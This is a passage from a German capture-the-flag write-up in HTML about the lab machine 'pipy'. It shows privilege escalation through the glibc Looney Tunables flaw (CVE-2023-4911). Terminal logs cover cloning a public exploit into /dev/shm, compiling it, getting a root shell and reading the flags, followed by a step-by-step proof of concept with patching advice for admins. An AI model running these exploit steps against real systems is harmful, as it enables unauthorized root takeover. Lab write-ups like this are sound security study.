+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+Written by Roland McGrath and Ulrich Drepper.
+                      </pre>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Versuch, ein Verzeichnis im Home-Verzeichnis zu erstellen, schlägt wegen Platzmangel fehl. Wechsel nach `/dev/shm` (RAM-Disk) und erfolgreiche Erstellung des `hacker`-Verzeichnisses. Klonen des Git-Repositories für den Looney Tunables Exploit (CVE-2023-4911).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Problem des vollen Home-Verzeichnisses wird umgangen, indem `/dev/shm` verwendet wird. Der Exploit-Code für die vielversprechende GLIBC-Schwachstelle wird erfolgreich heruntergeladen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kompilieren und führen Sie den heruntergeladenen Exploit aus.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie den Speicherplatz. Untersuchen Sie, warum das Home-Verzeichnis voll ist. Patchen Sie GLIBC gegen CVE-2023-4911.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm$ <span class="command">cd ~</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">mkdir hacker</span></div>
+                     <pre>mkdir: cannot create directory ‘hacker’: No space left on device</pre>
+                     <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">cd -</span></div>
+                     <pre>/dev/shm</pre>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm$ <span class="command">mkdir hacker</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm$ <span class="command">cd hacker/</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker$ <span class="command">git clone https://github.com/leesh3288/CVE-2023-4911.git</span></div>
+                     <pre>
+Cloning into 'CVE-2023-4911'...
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 9 (delta 2), reused 9 (delta 2), pack-reused 0
+Receiving objects: 100% (9/9), done.
+Resolving deltas: 100% (2/2), done.
+                     </pre>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker$ <span class="command">ll</span></div>
+                     <pre>
+total 0
+drwxrwxr-x 3 angela angela  60 Oct 26 22:21 ./
+drwxrwxrwt 3 root   root    80 Oct 26 22:21 ../
+drwxrwxr-x 3 angela angela 140 Oct 26 22:21 CVE-2023-4911/
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Überschrift "Privilege Escalation" leitet den finalen Schritt ein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Vorbereitung auf die Ausführung des Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Exploit kompilieren und ausführen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+                                                          Privilege Escalation
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Wechsel in das Exploit-Verzeichnis. Kompilieren des Exploits (`exp.c`) mit `gcc` zur ausführbaren Datei `hack`. Auflisten des Verzeichnisses. Versuch, den Exploit über `make` auszuführen (wird abgebrochen). Schließlich direkter Start des kompilierten Exploits `./hack`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Kompilieren ist erfolgreich. Der Exploit (`./hack`) wird gestartet und läuft durch mehrere Versuche (`try 100`, `try 200`, ...). Schließlich gelingt der Exploit und liefert eine Root-Shell (`#`). Der `id`-Befehl bestätigt `uid=0(root)`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fantastisch! Der Looney Tunables Exploit war erfolgreich. Root-Zugriff wurde erlangt. Suchen und lesen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Patchen Sie GLIBC dringend gegen CVE-2023-4911. Überwachen Sie die Ausführung von unbekannten kompilierten Programmen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker$ <span class="command">cd CVE-2023-4911/</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker/CVE-2023-4911$ <span class="command">gcc exp.c -o hack</span></div>
+                     <!-- <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker/CVE-2023-4911$ <span class="command">ls -la</span></div> --> <!-- ls -la wird im Text später gezeigt -->
+                     <div class="prompt remote-prompt">angela@pipy:~/hacker/CVE-2023-4911$ <span class="command">ls -la</span></div> <!-- Pfad im Prompt passt nicht ganz zum cd davor -->
+                     <pre>
+total 2240
+drwxrwxr-x 4 angela angela    4096 Oct 26 22:40  .
+drwxrwxr-x 3 angela angela    4096 Oct 26 22:39  ..
+-rwxrwxr-x 1 angela angela   16600 Oct 26 22:40  exp # Original exploit file name?
+-rw-rw-r-- 1 angela angela    3815 Oct 26 22:39  exp.c
+-rw-rw-r-- 1 angela angela     390 Oct 26 22:39  gen_libc.py
+drwxrwxr-x 8 angela angela    4096 Oct 26 22:39  .git
+-rwxrwxr-x 1 angela angela   16600 Oct 26 22:40  hack # Compiled exploit
+-rw-rw-r-- 1 angela angela 2216304 Oct 26 22:40  libc.so.6 # Likely generated by gen_libc.py
+-rw-rw-r-- 1 angela angela     179 Oct 26 22:39  Makefile
+-rw-rw-r-- 1 angela angela     717 Oct 26 22:39  README.md
+                     </pre>
+                      <div class="prompt remote-prompt">angela@pipy:~/hacker/CVE-2023-4911$ <span class="command">make</span></div>
+                      <pre>
+./exp
+try 100
+try 200
+try 300
+^Cmake: *** wait: No child processes.  Stop.
+make: *** Waiting for unfinished jobs....
+make: *** wait: No child processes.  Stop.
+                      </pre>
+                       <div class="prompt remote-prompt">angela@pipy:~/hacker/CVE-2023-4911$ <span class="command">./hack</span></div>
+                       <pre>
+try 100
+try 200
+try 300
+try 400
+try 500
+try 600
+try 700
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(angela)
+#
+                       </pre>
+                        <div class="prompt root-prompt"># <span class="command"></span></div>
+                    </div>
+                </div>
+
+             <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird ins `/root`-Verzeichnis gewechselt, der Inhalt aufgelistet und `root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gefunden: `<span class="password">ab55ed08716cd894e8097a87dafed016</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Flags gesammelt, Test erfolgreich abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Root-Flag sichern, GLIBC patchen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt root-prompt"># <span class="command">cd /root</span></div>
+                     <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                     <pre>root.txt  snap</pre>
+                     <div class="prompt root-prompt"># <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">ab55ed08716cd894e8097a87dafed016</span></pre>
+                      <div class="prompt root-prompt"># <span class="command"></span></div>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Kommentar, der den erfolgreichen Abschluss der Privilegieneskalation markiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Erlangung von Root-Rechten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Klare Dokumentation des Weges (RCE -> DB -> su -> Exploit).<br><strong>Empfehlung (Admin):</strong> Fokus auf die Behebung der ursprünglichen RCE in SPIP und der GLIBC-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+  Privilege Escalation erfolgreich
+                     </pre>
+                 </div>
+            </div>
+        </section>
+
+        <!-- POC Section für Looney Tunables Exploit -->
+        <section id="proof-of-concept">
+            <h2>Proof of Concept: Ausnutzung der Looney Tunables Schwachstelle (CVE-2023-4911)</h2>
+            <p><strong>Kurzbeschreibung:</strong> Das System verwendet eine anfällige Version der GNU C Library (GLIBC < 2.38), die von der "Looney Tunables"-Schwachstelle (CVE-2023-4911) betroffen ist. Diese Schwachstelle im dynamischen Lader (`ld.so`) ermöglicht durch einen Pufferüberlauf bei der Verarbeitung der `GLIBC_TUNABLES`-Umgebungsvariable die lokale Eskalation von Privilegien zu Root.</p>
+            <p><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugang zum System als nicht-privilegierter Benutzer (hier `angela`).</li>
+                    <li>GLIBC-Version < 2.38 auf dem Zielsystem.</li>
+                    <li>Ein funktionierender Exploit-Code für CVE-2023-4911.</li>
+                    <li>Möglichkeit, Code auf dem Zielsystem zu kompilieren (gcc/make) und auszuführen.</li>
+                    <li>Ein beschreibbares Verzeichnis (hier `/dev/shm` verwendet).</li>
+                </ul>
+            </p>
+            <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+            <p class="analysis"><strong>Analyse Schritt 1:</strong> Überprüfung der GLIBC-Version auf dem Zielsystem.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 1:</strong> Der Befehl `ldd --version` zeigt Version 2.35 an, die bekanntermaßen für CVE-2023-4911 anfällig ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt die Anwendbarkeit des Exploits.<br><strong>Empfehlung (Admin):</strong> Update von GLIBC ist dringend erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:~$ <span class="command">ldd --version</span></div>
+                     <pre>ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35 [...]</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse Schritt 2:</strong> Herunterladen des Exploit-Codes von einer öffentlichen Quelle (z.B. GitHub) in ein beschreibbares Verzeichnis (`/dev/shm`).</p>
+            <p class="evaluation"><strong>Bewertung Schritt 2:</strong> Der Exploit-Code ist nun auf dem Zielsystem verfügbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass alle benötigten Dateien des Exploits heruntergeladen wurden.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Downloads von bekannten Exploit-Repositories.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm$ <span class="command">mkdir hacker && cd hacker</span></div>
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker$ <span class="command">git clone https://github.com/leesh3288/CVE-2023-4911.git</span></div>
+                     <pre>Cloning into 'CVE-2023-4911'...</pre> <!-- Gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse Schritt 3:</strong> Kompilieren des Exploit-Codes mit `gcc`.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 3:</strong> Eine ausführbare Datei (hier `hack`) wird erstellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Kompilierungsvorgang fehlerfrei abgeschlossen wird.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Verfügbarkeit von Compilern auf Produktivsystemen, wenn möglich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:/dev/shm/hacker/CVE-2023-4911$ <span class="command">gcc exp.c -o hack</span></div>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse Schritt 4:</strong> Ausführen der kompilierten Exploit-Datei.</p>
+            <p class="evaluation"><strong>Bewertung Schritt 4:</strong> Der Exploit nutzt die GLIBC-Schwachstelle aus und startet eine Shell mit Root-Rechten, was durch `id` bestätigt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Exploit war erfolgreich. Root-Zugriff erlangt.<br><strong>Empfehlung (Admin):</strong> Patchen Sie GLIBC.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">angela@pipy:~/hacker/CVE-2023-4911$ <span class="command">./hack</span></div>
+                     <pre>
+try 100
+try 200
+try 300
+try 400
+try 500
+try 600
+try 700
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(angela)
+#
+                     </pre>
+                      <div class="prompt root-prompt"># <span class="command"></span></div>
+                  </div>
+              </div>
+            <p><strong>Erwartetes Ergebnis:</strong> Erfolgreiche Erlangung einer interaktiven Shell mit root-Berechtigungen.</p>
+            <p><strong>Beweismittel:</strong> Die empfangene Shell mit Root-Kennung (`#` Prompt, `uid=0(root)`) nach Ausführung des kompilierten Exploits.</p>
+            <p><strong>Risikobewertung:</strong> Kritisch. Diese Schwachstelle erlaubt jedem lokalen Benutzer die vollständige Übernahme des Systems.</p>
+            <p><strong>Empfehlungen:</strong> Aktualisieren Sie die GNU C Library (GLIBC) dringend auf eine gepatchte Version (>= 2.38) oder wenden Sie die von Ihrem Distributions-Anbieter bereitgestellten Patches an.</p>
+        </section>
+
+
+        <section id="flags">
+             <!-- Flag-Container für Zentrierung und Styling -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/angela/user.txt</div> <!-- Befehl rekonstruiert -->
+                    <div class="flag-value"><span class="password">dab37650d43787424362d5805140538d</span></div>
+                </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div> <!-- Befehl rekonstruiert -->
+                    <div class="flag-value"><span class="password">ab55ed08716cd894e8097a87dafed016</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum extrahiert aus der ersten Nikto Zeitangabe -->
+        <p>Berichtsdatum: 2023-10-26</p>
+    </footer>
+</body>
+</html>
